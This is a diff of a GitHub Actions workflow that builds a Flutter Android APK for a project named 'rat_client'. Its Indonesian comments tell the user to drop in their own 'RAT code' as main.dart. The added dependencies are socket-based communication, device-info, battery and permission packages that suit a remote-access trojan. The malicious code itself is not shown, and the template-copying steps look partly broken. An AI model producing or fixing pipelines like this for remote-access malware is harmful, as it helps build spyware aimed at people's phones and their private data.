@@ -9,7 +9,7 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout code
+      - name: Checkout Code
         uses: actions/checkout@v4
 
       - name: Setup Java
@@ -23,12 +23,25 @@ jobs:
         with:
           flutter-version: '3.19.0'
 
-      - name: Generate Android Folder
-        run: flutter create --platforms=android --org com.example --project-name rat_client .
+      # TRIK: Download template project Android V2 yang sudah jadi
+      - name: Download Android V2 Template
+        run: |
+          git clone https://github.com/flutter/flutter.git -b stable --depth 1 /tmp/flutter_source
+          cp -r /tmp/flutter_source/packages/flutter_tools/templates/app/android.tmpl ./android
+          cp -r /tmp/flutter_source/packages/flutter_tools/templates/app/ios.tmpl ./ios
+          
+          # Hapus file bawaan template yang bikin error
+          rm -rf ./android.tmpl ./ios.tmpl ./lib/main.dart
 
+      # TIMPA dengan kode RAT kamu
+      - name: Copy Your Main Dart
+        run: cp main.dart lib/main.dart
+
+      # Tambahkan dependencies
       - name: Get Dependencies
-        run: flutter pub get
+        run: flutter pub add socket_io_client device_info_plus battery_plus permission_handler
 
+      # Build!
       - name: Build APK
         run: flutter build apk --release
 
